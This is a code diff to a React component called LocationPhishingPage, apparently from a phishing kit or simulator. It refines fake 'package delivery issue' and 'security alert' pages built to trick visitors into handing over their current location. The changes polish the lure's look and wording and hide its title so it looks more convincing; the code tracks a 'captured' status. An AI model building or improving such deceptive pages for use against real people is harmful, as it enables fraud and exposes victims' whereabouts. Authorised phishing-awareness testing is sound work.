@@ -24,7 +24,7 @@ const templateContent: Record<string, TemplateContent> = {
     title: 'Action Required: Package Delivery Issue',
     actionText: 'Verify Delivery Address & Reschedule',
     message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
-    pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
+    pageSpecificMessage: "To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
     heroIcon: Truck,
   },
   'security-alert': {
@@ -148,8 +148,8 @@ export default function LocationPhishingPage() {
             <p className="text-xl text-muted-foreground leading-relaxed">
               {content.message}
             </p>
-            <div className="border rounded-lg p-4 sm:p-6 bg-secondary/20 space-y-3 text-left shadow-sm">
-              <h3 className="text-lg font-semibold text-foreground mb-2">Package Status Update:</h3>
+            <ShadcnCard className="text-left bg-secondary/20 shadow-sm p-4 sm:p-6">
+              <ShadcnCardTitle className="text-lg font-semibold text-foreground mb-3">Package Status Update:</ShadcnCardTitle>
               <div className="grid grid-cols-[auto_1fr] gap-x-4 gap-y-2 text-sm sm:text-md">
                 <span className="font-medium text-muted-foreground">Tracking ID:</span>
                 <span className="text-foreground font-mono bg-muted/50 px-2 py-0.5 rounded-sm">#TZ78391B</span>
@@ -163,7 +163,7 @@ export default function LocationPhishingPage() {
                 <span className="font-medium text-muted-foreground">Last Update:</span>
                 <span className="text-foreground">{currentTime || 'Fetching time...'}</span>
               </div>
-            </div>
+            </ShadcnCard>
             <p className="text-md text-muted-foreground/90 pt-2">
               {content.pageSpecificMessage}
             </p>
@@ -173,11 +173,11 @@ export default function LocationPhishingPage() {
       case 'security-alert':
         return (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
-            <div className="flex items-start mb-3"> {/* items-start for better alignment with multi-line text */}
-              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground flex-shrink-0 mt-1" /> {/* Larger icon, margin, alignment */}
+            <div className="flex items-start mb-3"> 
+              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground flex-shrink-0 mt-1" /> 
               <div>
-                <AlertTitle className="text-2xl font-bold text-destructive-foreground mb-1">{content.title}</AlertTitle> {/* Bolder, larger */}
-                <AlertDescription className="text-md text-destructive-foreground/90 leading-relaxed"> {/* Better line height */}
+                <AlertTitle className="text-2xl font-bold text-destructive-foreground mb-1">{content.title}</AlertTitle> 
+                <AlertDescription className="text-md text-destructive-foreground/90 leading-relaxed"> 
                   {content.pageSpecificMessage || content.message}
                 </AlertDescription>
               </div>
@@ -206,7 +206,7 @@ export default function LocationPhishingPage() {
 
   return (
     <PhishingPageLayout 
-        title={content.title} 
+        title={templateId === 'package-delivery-issue' ? '' : content.title} 
         isLoading={isLoading && status !== 'captured'}
         error={error}
         statusMessage={statusMessage}
@@ -255,4 +255,6 @@ export default function LocationPhishingPage() {
     </PhishingPageLayout>
   );
 }
+    
+
     
